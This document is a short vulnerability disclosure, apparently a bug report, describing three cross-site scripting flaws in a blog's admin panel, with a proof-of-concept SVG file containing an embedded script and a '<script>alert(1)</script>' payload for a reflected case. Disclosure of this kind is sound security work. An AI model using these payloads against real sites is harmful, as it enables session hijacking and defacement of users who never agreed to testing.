
### XSS via SVG File Upload

Steps to Reproduce:

1. Login with admin user
2. Visit "Media" page
3. Upload xss.svg
4. Click "View" and XSS payload will execute

```
// xss.svg contents

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(`XSS`);
   </script>
</svg>
```

### Reflected XSS

Steps to Reproduce:

1. Login as admin
2. Visit "Media" page
3. Click "Delete" and intercept the HTTP GET request
4. In "file" parameter add the payload ```"<script>alert(1)</script>"```
5. After forwarding the HTTP GET request a browser popup would surface


### Stored XSS

1. Steps to Reproduce:
2. Login as admin
3. Visit "Settings" page
4. Enter XSS payload in "Title", "Subtitle", "Footer"
5. Then visit the blog page

